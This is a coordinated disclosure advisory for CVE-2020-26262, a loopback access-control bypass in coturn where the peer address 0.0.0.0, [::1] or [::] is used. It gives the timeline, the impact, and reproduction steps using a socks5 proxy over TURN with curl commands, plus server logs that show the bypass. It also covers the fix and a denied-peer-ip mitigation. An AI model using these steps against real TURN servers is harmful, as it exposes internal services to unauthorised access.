# Loopback access control bypass in coturn by using `0.0.0.0`, `[::1]` or `[::]` as the peer address

- Fixed version: 4.5.2
- Enable Security Advisory: https://github.com/EnableSecurity/advisories/tree/master/ES2021-01-coturn-access-control-bypass
- Coturn Security Advisory: https://github.com/coturn/coturn/security/advisories/GHSA-6g6j-r9rf-cm7p
- Other references:
    - CVE-2020-26262
    - https://www.rtcsec.com/post/2021/01/details-about-cve-2020-26262-bypass-of-coturns-default-access-control-protection/
- Tested vulnerable versions: 4.5.1.x
- Timeline:
    - Report date: 2020-11-20
    - Issue confirmed by coturn developers: 2020-11-23
    - Security patch provided by Enable Security: 2020-11-30
    - Refactoring by coturn developers: 2020-12-07 to 2020-12-10
    - Joint Enable Security and Coturn project advisory publication: 2021-01-11

## Description

By default coturn does not allow peers to connect and relay packets to loopback addresses in the range of `127.x.x.x`. However, it was observed that when sending a `CONNECT` request with the `XOR-PEER-ADDRESS` value of `0.0.0.0`, a successful response was received and subsequently, `CONNECTIONBIND` also received a successful response. Coturn then was able to relay packets to local network services.

Additionally, when coturn was listening on IPv6, which is the default setting, local services could also be reached by making use of either `[::1]` or `[::]` as the peer address.

## Impact

By using the address `0.0.0.0` as the peer address, a malicious user will be able to relay packets to the loopback interface, unless `--denied-peer-ip=0.0.0.0` (or similar) has been specified. Since the default configuration implies that loopback peers are not allowed, coturn administrators may choose to not set the `denied-peer-ip` setting. Similar implications apply to the IPv6 equivalent of `[::1]` and `[::]`.

## How we reproduced the issue

1. Run coturn using the following command:

       turnserver -v --user=username1:password1
1. Run our internal tool `stunner`, acting as a socks5 proxy which uses TURN.

       stunner turn peer proxy socks5 tcp://172.17.0.2:3478 \
           --local-bind 0.0.0.0:9999 -u username1:password1
1. Run a cURL command to connect to `127.0.0.1:80`.

       curl -x socks5h://127.0.0.1:9999 http://127.0.0.1
1. The following log was observed, confirming that `127.0.0.1` is being blocked:

       725: IPv4. tcp or tls connected to: 172.17.0.1:36504
       725: session 011000000000000001: realm <172.17.0.2> user <>: 
           incoming packet message processed, error 401: Unauthorized
       725: IPv4. Local relay addr: 172.17.0.2:51705
       725: session 011000000000000001: new, realm=<172.17.0.2>, username=<username1>, 
           lifetime=600
       725: session 011000000000000001: realm <172.17.0.2> user <username1>: 
           incoming packet ALLOCATE processed, success
       725: session 011000000000000001: realm <172.17.0.2> user <username1>: 
           incoming packet CONNECT processed, error 403: Forbidden IP
       725: session 011000000000000001: realm <172.17.0.2> user <username1>: 
           incoming packet message processed, error 403: Forbidden IP
1. Run a cURL command to connect to `0.0.0.0:80`.

       curl -x socks5h://127.0.0.1:9999 http://0.0.0.0
1. The following log was observed, confirming that the loopback protection has been bypassed:

       1010: IPv4. tcp or tls connected to: 172.17.0.1:37240
       1010: session 005000000000000001: realm <172.17.0.2> user <>: 
           incoming packet message processed, error 401: Unauthorized
       1010: IPv4. Local relay addr: 172.17.0.2:62504
       1010: session 005000000000000001: new, realm=<172.17.0.2>, 
           username=<username1>, lifetime=600
       1010: session 005000000000000001: realm <172.17.0.2> user <username1>: 
           incoming packet ALLOCATE processed, success
       1010: session 005000000000000001: realm <172.17.0.2> user <username1>: 
           incoming packet CONNECT processed, success
       1010: IPv4. tcp or tls connected to: 172.17.0.1:37242
       1010: session 000000000000000001: client socket to be closed in client handler
       1010: session 000000000000000001: usage: realm=<172.17.0.2>, username=<>
       1010: session 005000000000000001: realm <172.17.0.2> user <username1>: 
           incoming packet CONNECTION_BIND processed, success
       1010: session 000000000000000001: peer usage: realm=<172.17.0.2>
       1010: session 000000000000000001: closed (2nd stage), user <> 
           realm <172.17.0.2> origin <>, local 172.17.0.2:3478, 
           remote 172.17.0.1:37242, reason: general

The 5th step could be repeated with the URL of `http://[::1]` and `http://[::]` where one would also bypass the default protection against loopback connections.

## Solution and recommendations

We recommend upgrading coturn to the latest version, 4.5.2 which fixes this issue.

To mitigate this issue in previous versions, the addresses in the address block `0.0.0.0/8` should be denied by making use of the `denied-peer-ip` configuration setting. The following is an example configuration that prevents access to `0.0.0.0`:

```
denied-peer-ip=0.0.0.0-0.255.255.255
```

Additionally, as a mitigation step when the patch cannot yet be applied, we recommend disabling IPv6 if not required by listening on an IPv4 IP address. See our blog post for an [explanation][1] for this recommendation.

[1]: https://www.rtcsec.com/post/2021/01/details-about-cve-2020-26262-bypass-of-coturns-default-access-control-protection/#faq

Enable Security would like to thank Mészáros Mihály and the developers at Coturn for the very quick response and fixing this security issue.


## About Enable Security

[Enable Security](https://www.enablesecurity.com) develops offensive security tools and provides quality penetration testing to help protect your real-time communications systems against attack.

## Disclaimer

The information in the advisory is believed to be accurate at the time of publishing based on currently available information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.

## Disclosure policy

This report is subject to Enable Security's vulnerability disclosure policy which can be found at <https://github.com/EnableSecurity/Vulnerability-Disclosure-Policy>.

